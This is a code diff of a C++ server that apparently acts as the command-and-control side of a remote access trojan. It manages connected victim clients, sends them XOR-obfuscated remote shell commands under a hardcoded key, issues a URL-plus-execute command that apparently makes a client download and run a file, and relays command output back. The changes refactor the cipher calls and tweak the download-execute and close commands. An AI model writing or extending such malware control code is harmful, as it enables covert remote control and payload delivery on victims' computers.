@@ -215,7 +215,7 @@ void Server::ParseClientCommand(std::string strCommand, int iClientID){
 										if(Clients[iClientID] == nullptr){
 											break;
 										}
-										strFinal = txtCipher.ShellXor(std::string(cCmdLine), "password");
+										strFinal = ShellXor(std::string(cCmdLine), "password");
 										iStrLen = strFinal.length();
 										if(send(Clients[iClientID]->sckSocket, strFinal.c_str(), iStrLen, 0) <= 0){
 											std::cout<<"Unable to send command to client\n";
@@ -361,6 +361,8 @@ void Server::ParseClientCommand(std::string strCommand, int iClientID){
 				strCommandLine.append(strUrl);
 				strCommandLine.append(1, '@');
 				strCommandLine.append(1, cExec);
+				strCommandLine.append(1, '@');
+				strCommandLine.append(3, 'A');
 				if(ssSendBinary(Clients[iClientID]->sckSocket, strCommandLine.c_str(), 0) > 0){
 					std::cout<<"\n\tSent\n";
 				} else {
@@ -549,7 +551,7 @@ void Server::ParseBasicInfo(char*& cBuffer, int iOpt){
 }
 
 int Server::ssSendStr(int sckSocket, const std::string& strMessage){
-	std::string strTmp = txtCipher.strCipher(strMessage);
+	std::string strTmp = strCipher(strMessage);
 	int sBytes = strTmp.length();
 	int iBytes = send(sckSocket, strTmp.c_str(), sBytes, 0);
 	return iBytes;
@@ -561,7 +563,7 @@ int Server::ssRecvStr(int sckSocket, std::string& strOutput, int sBytes){
 	if(iBytes <= 0){
 		return -1;
 	}
-	strOutput = txtCipher.strUnCipher(std::string(tmpData));
+	strOutput = strUnCipher(std::string(tmpData));
 	delete[] tmpData;
 	tmpData = nullptr;
 	return iBytes;
@@ -569,7 +571,7 @@ int Server::ssRecvStr(int sckSocket, std::string& strOutput, int sBytes){
 
 int Server::ssSendBinary(int sckSocket, const char* cData, int iBytes){
 	char *tmpData = nullptr;
-	txtCipher.BinaryCipher(cData, tmpData);
+	BinaryCipher(cData, tmpData);
 	//Size not specified so calculate length of data to send
 	if(iBytes == 0){
 		iBytes = Misc::StrLen(tmpData);
@@ -593,7 +595,7 @@ int Server::ssRecvBinary(int sckSocket, char*& cOutput, int sBytes){
 		return -1;
 	}
 	cBuffer[iBytes] = '\0';
-	cOutput = txtCipher.BinaryUnCipher((const char *)cBuffer);
+	cOutput = BinaryUnCipher((const char *)cBuffer);
 	delete[] cBuffer;
 	cBuffer = nullptr;
 	return iBytes;
@@ -790,9 +792,7 @@ void Server::threadMasterCMD(){
 						}while(strClientCmd != "exit");
 					}else if(strAction == "close"){ //close client conenction
  						if(Clients[iClientId] != nullptr && Clients[iClientId]->isConnected){
-							if(ssSendBinary(Clients[iClientId]->sckSocket,CommandCodes::cClose, 0) > 0){
-								close(Clients[iClientId]->sckSocket);
-							} else {
+							if(ssSendBinary(Clients[iClientId]->sckSocket,CommandCodes::cClose, 0) <= 0){
 								std::cout<<"Unable to send close command\n";
 								error();
 							}
@@ -902,7 +902,7 @@ void Server::threadRemoteCmdOutput(int iClientID){
 			iBytes = recv(Clients[iClientID]->sckSocket, cCmdBuffer, 1024, 0);
 			if(iBytes > 0){
 				strTmp = cCmdBuffer;
-				strCmdBuffer = txtCipher.ShellXor(strTmp, strPassword);
+				strCmdBuffer = ShellXor(strTmp, strPassword);
 				std::cout<<strCmdBuffer;
 			} else if(iBytes == -1){
 				std::cout<<"Socket error\n";
